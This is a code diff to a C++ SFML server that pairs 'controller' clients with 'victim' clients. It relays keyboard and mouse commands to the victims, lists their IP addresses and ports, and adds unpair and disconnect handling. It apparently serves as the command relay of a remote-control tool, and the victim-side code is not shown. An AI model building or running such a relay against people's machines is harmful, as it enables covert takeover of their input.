@@ -14,54 +14,55 @@ void Server::receive()
 {
 	if (!selector.wait())
 		return;
-	
+
 	//check if a client has received something
-	for (int i = 0; i < clients.size(); i++) {
-		if (!selector.isReady(*clients[i].socket))
+	for (auto& c : clients) {
+		if (!selector.isReady(*c.second.socket))
 			continue;
-	
+
 		sf::Packet p;
-		clients[i].socket->receive(p);
+		c.second.socket->receive(p);
 
 		//disconnect client
 		if (p.getDataSize() == 0) {
-			disconnect(i);
+			disconnect(c.first);
 			break;
 		}
 
 		//process packet according to sender's role
-		if (clients[i].role == 'c')
-			processControllerMsg(i, p);
-		else if (clients[i].role == 'v')
-			processVictimMsg(i, p);
-		else if (clients[i].role == '-') {
+		if (c.second.role == 'c')
+			processControllerMsg(c.first, p);
+		else if (c.second.role == 'v')
+			processVictimMsg(c.first, p);
+		else if (c.second.role == '-') {
 			sf::Uint8 role;
 			p >> role;
 			p.clear();
-			
+
 			if (role == 'c' || role == 'v') {
 				p << sf::Uint8(role);
 				if (role == 'c')
-					p << sf::Uint16(clients[i].id);
-				clients[i].socket->send(p);
-				clients[i].role = role;
+					p << sf::Uint16(c.first);
+				c.second.socket->send(p);
+				c.second.role = role;
+				std::cout << "new " << role << " - id: " << c.first << "\n";
 
 				updateControllersList();
 			}
 			else {
 				p << sf::Uint8('?');
-				clients[i].socket->send(p);
+				c.second.socket->send(p);
 			}
 		}
-	
+
 		break;
 	}
 	//check if a client is ready to connect
 	if (selector.isReady(listener)) {
-		Client c(++currentId);
+		Client c;
 		if (listener.accept(*c.socket) == sf::Socket::Done) {
 			selector.add(*c.socket);
-			clients.push_back(c);
+			clients.insert({ ++currentId, c });
 		}
 		else {
 			delete c.socket;
@@ -70,55 +71,110 @@ void Server::receive()
 	}
 }
 
-void Server::processControllerMsg(int i, sf::Packet p)
+void Server::processControllerMsg(sf::Uint8 id, sf::Packet p)
 {
 	sf::Uint8 cmd;
 	p >> cmd;
 
 	//pair controller with victim
 	if (cmd == 'p') {
-		sf::Uint16 id;
-		p >> id;
-		if (clients[i].pair == nullptr) { 		
-			for (auto& v : clients) {
-				if (v.id == id) {
-					if (v.role != 'v' || v.pair != nullptr)
-						break;
+		sf::Uint16 vId;
+		p >> vId;
+		//controller is already paired
+		if (clients[id].pair != 0)
+			return;
+		//other client doesnt exist
+		if (clients.find(vId) == clients.end())
+			return;
+		//other client is not a victim or is already paired
+		if (clients[vId].role != 'v' || clients[vId].pair != 0)
+			return;
 
-					p.clear();
-					p << sf::Uint8('p');
-					clients[i].socket->send(p);
+		p.clear();
+		p << sf::Uint8('p');
+		//tell controller that is has been paired
+		clients[id].socket->send(p);
 
-					v.pair = &clients[i];
-					clients[i].pair = &v;
-					updateControllersList();
+		//actually pair the 2 clients
+		clients[vId].pair = id;
+		clients[id].pair = vId;
 
-					break;
-				}
-			}
+		updateControllersList();
+	}
+	//forward events to client
+	else if ((cmd == 'm' || cmd == 'n' || cmd == 'l' || cmd == 'k' || cmd == 'a')) {
+		//controller is not paired
+		if (clients[id].pair == 0)
+			return;
+
+		clients[clients[id].pair].socket->send(p);
+	}
+	//unpair controller from victim
+	else if (cmd == 'u') {
+		//controller is not paired
+		if (clients[id].pair == 0)
+			return;
+
+		sf::Packet p;
+		p << sf::Uint8('u');
+		//tell controller to unpair
+		clients[id].socket->send(p);
+
+		//actually unpair the 2 clients
+		clients[clients[id].pair].pair = 0;
+		clients[id].pair = 0;
+
+		updateControllersList();
+	}
+	//disconnect client
+	else if (cmd == 'e') {
+		sf::Uint16 oId;
+		p >> oId;
+
+		//client doesnt exist
+		if (clients.find(oId) == clients.end())
+			return;
+		//client isnt initialized
+		if (clients[oId].role == '-')
+			return;
+
+		disconnect(oId);
+	}
+}
+
+void Server::processVictimMsg(sf::Uint8 id, sf::Packet p)
+{
+}
+
+void Server::disconnect(sf::Uint8 id)
+{
+	sf::Packet p;
+	p << sf::Uint8('e');
+	clients[id].socket->send(p);
+
+	//unpair the paired client
+	if (clients[id].pair != 0) {
+		//if client is controller, tell him to unpair
+		if (clients[clients[id].pair].role == 'c') {
+			p.clear();
+			p << sf::Uint8('u');
+			clients[clients[id].pair].socket->send(p);
 		}
-
+		//if client is victim, tell his to release all keys
+		else if (clients[clients[id].pair].role == 'v')
+		{
+			p.clear();
+			p << sf::Uint8('a');
+			clients[clients[id].pair].socket->send(p);
+		}
+		
+		//actually unpair other client
+		clients[clients[id].pair].pair = 0;
 	}
-	if ((cmd == 'm' || cmd == 'n') && clients[i].pair != nullptr) {
-		clients[i].pair->socket->send(p);
-	}
-}
-
-void Server::processVictimMsg(int i, sf::Packet p)
-{
-}
-
-void Server::disconnect(int i)
-{
-	std::cout << clients[i].id << " disconnected\n";
-	for (auto& c : clients) {
-		if (c.pair != nullptr && c.pair->id == clients[i].id)
-			c.pair = nullptr;
-	}
-	selector.remove(*clients[i].socket);
-	delete clients[i].socket;
-	clients.erase(clients.begin() + i);
-
+	selector.remove(*clients[id].socket);
+	delete clients[id].socket;
+	clients.erase(id);
+	std::cout << "id: " << id << " disconnected\n";
 	updateControllersList();
 }
 
@@ -127,31 +183,35 @@ void Server::updateControllersList()
 	auto sendControllers = [this](sf::Packet p) {
 		for (auto& c : clients)
 		{
-			if (c.role == 'c')
-				c.socket->send(p);
+			if (c.second.role == 'c')
+				c.second.socket->send(p);
 		}
 	};
 
+	//tell controllers to clear clients list
 	sf::Packet p;
 	p << sf::Uint8('q');
 	sendControllers(p);
 
+	//send to controllers each client info
 	for (const auto& c : clients) {
-		if (c.role == '-')
+		//skip if client isnt initialized
+		if (c.second.role == '-')
 			continue;
 
 		p.clear();
-		p << ((c.role == 'c') ? sf::Uint8('n') : sf::Uint8('l')) << c.id << c.time;
-		p << c.socket->getRemoteAddress().toInteger() << c.socket->getRemotePort();
+		p << ((c.second.role == 'c') ? sf::Uint8('n') : sf::Uint8('l')) << c.first << c.second.time;
+		p << c.second.socket->getRemoteAddress().toInteger() << c.second.socket->getRemotePort();
 
-		if (c.pair != nullptr)
-			p << c.pair->id;
+		if (c.second.pair != 0)
+			p << c.second.pair;
 		else
 			p << sf::Uint16(0);
 
 		sendControllers(p);
 	}
 
+	//tell controllers to display clients list
 	p.clear();
 	p << sf::Uint8('d');
 	sendControllers(p);
